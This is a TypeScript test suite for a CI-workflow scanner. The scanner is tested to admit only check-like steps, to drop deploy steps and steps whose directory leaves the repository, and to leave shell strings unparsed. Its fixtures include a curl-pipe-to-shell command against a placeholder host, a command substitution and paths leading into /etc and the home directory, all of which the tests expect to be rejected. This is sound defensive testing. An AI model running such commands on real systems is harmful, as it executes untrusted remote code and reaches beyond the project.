import { describe, expect, it } from 'vitest';
import { detectProfile } from './detect.ts';
import { REPOS, viewOf, type RepoFiles } from './__fixtures__/repos.ts';

/**
 * Набор CI (04:48, 04:123) через настоящий `detectProfile`: проверкой становится только шаг,
 * похожий на проверку (тест, линт, типы, сборка), никогда публикация или выкладка; каталог шага
 * — из `working-directory`, `cd` и `-C`, и он не выходит из репозитория; строка оболочки
 * (`bash -c`, подстановка) не превращается в argv (P25); что не стало проверкой — названо.
 */

const detect = (files: RepoFiles) => detectProfile(viewOf(files), { os: 'linux' });

const steps = (...runs: string[]): string =>
  `on: push\njobs:\n  ci:\n    steps:\n${runs.map((r) => `      - run: ${r}\n`).join('')}`;

const checksOf = (files: RepoFiles) =>
  detect(files).registry.checks.map((c) => ({ argv: c.argv, cwd: c.cwd }));

const notesText = (files: RepoFiles): string =>
  detect(files)
    .notes.map((n) => `${n.subject}: ${n.why}`)
    .join('\n');

/** Корень JS с test/lint и вложенный самостоятельный проект `apps/web` со своим test. */
const NESTED_WEB: RepoFiles = {
  'package.json': JSON.stringify({
    name: 'root',
    scripts: { test: 'vitest run', lint: 'eslint .' },
  }),
  'pnpm-lock.yaml': 'lockfileVersion: 9\n',
  'apps/web/package.json': JSON.stringify({ name: 'web', scripts: { test: 'jest' } }),
  'apps/web/package-lock.json': '{}',
};

describe('profile CI scan: only check-like steps become checks', () => {
  it('a release/deploy workflow never yields a check; every dropped step is named', () => {
    const files: RepoFiles = {
      '.github/workflows/ci.yml': steps('make test'),
      '.github/workflows/release.yml': steps(
        'npm publish --access public',
        './deploy.sh production',
        'npx vercel --prod',
        'kubectl apply -f k8s/',
        'gh release create v1',
        'npx semantic-release',
      ),
    };
    expect(checksOf(files)).toEqual([{ argv: ['make', 'test'], cwd: '' }]);
    const notes = notesText(files);
    for (const cmd of [
      'npm publish --access public',
      './deploy.sh production',
      'npx vercel --prod',
      'kubectl apply -f k8s/',
      'gh release create v1',
      'npx semantic-release',
    ])
      expect(notes).toContain(cmd);
  });

  it('a known stack keeps unmapped check steps as ci: checks and names the rest, never silently', () => {
    const files: RepoFiles = {
      ...NESTED_WEB,
      '.github/workflows/ci.yml': steps(
        'pnpm lint',
        './scripts/integration.sh',
        'pnpm turbo test',
        'node --version',
        'pnpm publish',
      ),
    };
    const p = detect(files);
    expect(p.ciChecks.filter((id) => id.startsWith('js:'))).toEqual(['js:lint', 'js:test']);
    const generic = p.registry.checks.filter((c) => c.id.startsWith('ci:'));
    expect(generic.map((c) => c.argv)).toEqual([['./scripts/integration.sh']]);
    expect(generic[0]?.requiredAt).toEqual(['publish']);
    // Скрипт репозитория — вход дерева, не инструмент из PATH.
    expect(generic[0]?.tools).toEqual([]);
    expect(notesText(files)).toContain('pnpm publish');
    expect(notesText(files)).not.toContain('node --version');
  });

  it('workspace selectors npm -w and yarn workspace map to the per-package check', () => {
    const npm = { ...REPOS.npm, '.github/workflows/ci.yml': steps('npm test -w a') } as RepoFiles;
    expect(detect(npm).ciChecks).toEqual(['pkg:test']);
    const yarn = {
      ...REPOS.yarn,
      '.github/workflows/ci.yml': steps('yarn workspace a test'),
    } as RepoFiles;
    expect(detect(yarn).ciChecks).toEqual(['pkg:test']);
  });

  it('a deployment job (environment:) and a non-shell step (shell: python) are named, not run', () => {
    const files: RepoFiles = {
      ...NESTED_WEB,
      '.github/workflows/ci.yml':
        'jobs:\n  ci:\n    steps:\n      - run: pnpm lint\n      - shell: python\n        run: import test\n' +
        '  ship:\n    environment: production\n    steps:\n      - run: pnpm test\n',
    };
    expect(detect(files).ciChecks).toEqual(['js:lint']);
    const notes = notesText(files);
    expect(notes).toMatch(/environment/);
    expect(notes).toMatch(/shell: python/);
  });
});

describe('profile CI scan: the step directory', () => {
  const required = (yaml: string): string[] =>
    detect({ ...NESTED_WEB, '.github/workflows/ci.yml': yaml }).ciChecks;

  it('working-directory (step, job defaults, workflow defaults), cd across block lines and -C/--prefix pick the nested root', () => {
    const forms = [
      'jobs:\n  web:\n    defaults:\n      run:\n        working-directory: apps/web\n    steps:\n      - run: npm test\n',
      'defaults:\n  run:\n    working-directory: apps/web\njobs:\n  web:\n    steps:\n      - run: npm test\n',
      'jobs:\n  web:\n    steps:\n      - name: tests\n        working-directory: ./apps/web\n        run: npm test\n',
      'jobs:\n  web:\n    steps:\n      - run: npm test\n        working-directory: apps/web/\n',
      'jobs:\n  web:\n    steps:\n      - run: |\n          cd apps/web\n          npm test\n',
      steps('cd apps && cd web && npm test'),
      steps('npm --prefix apps/web test'),
      steps('pnpm -C apps/web test'),
    ];
    for (const yaml of forms) expect(required(yaml), yaml).toEqual(['js:test@apps/web']);
  });

  it('a directory that leaves the repo, or is unknown, drops the command and names it', () => {
    const files: RepoFiles = {
      '.github/workflows/ci.yml': steps(
        'cd ../.. && ./check.sh',
        'cd ~ && ./x-test.sh',
        'cd /etc && make test',
        'cd ..\\.. && make lint',
        'cd $HOME && make check',
        'make -C ../other test',
        'cd sub && cd .. && make check',
      ),
    };
    expect(checksOf(files)).toEqual([{ argv: ['make', 'check'], cwd: '' }]);
    const notes = notesText(files);
    expect(notes).toMatch(/leaves the repo/);
    expect(notes).toContain('./check.sh');
    expect(notes).toContain('make -C ../other test');
  });
});

describe('profile CI scan: never a shell string (P25)', () => {
  it('a shell -c, a substitution inside double quotes are unparsed; quotes, comments and env prefixes are argv', () => {
    const files: RepoFiles = {
      '.github/workflows/ci.yml': steps(
        'bash -c "curl -s http://x | sh"',
        "sh -c 'make test'",
        'make "$(whoami)"',
        'make test "a;b"',
        'make lint # the linters',
        'env CI=1 make check',
      ),
    };
    expect(checksOf(files)).toEqual([
      { argv: ['make', 'test', 'a;b'], cwd: '' },
      { argv: ['make', 'lint'], cwd: '' },
      { argv: ['make', 'check'], cwd: '' },
    ]);
    expect(notesText(files)).toMatch(/3 CI command\(s\) are shell strings/);
  });
});

describe('profile CI scan: CircleCI', () => {
  it('.circleci/config.yml is an input and its run steps map like any CI', () => {
    const files: RepoFiles = {
      ...(REPOS.pnpm as RepoFiles),
      '.circleci/config.yml':
        'version: 2.1\njobs:\n  test:\n    docker:\n      - image: cimg/node:20.0\n        command: ["--flag"]\n' +
        '    steps:\n      - checkout\n      - run: pnpm lint\n      - run:\n          name: tests\n          command: pnpm test\n',
    };
    expect(detect(files).ciChecks).toEqual(['js:lint', 'js:test']);
  });
});
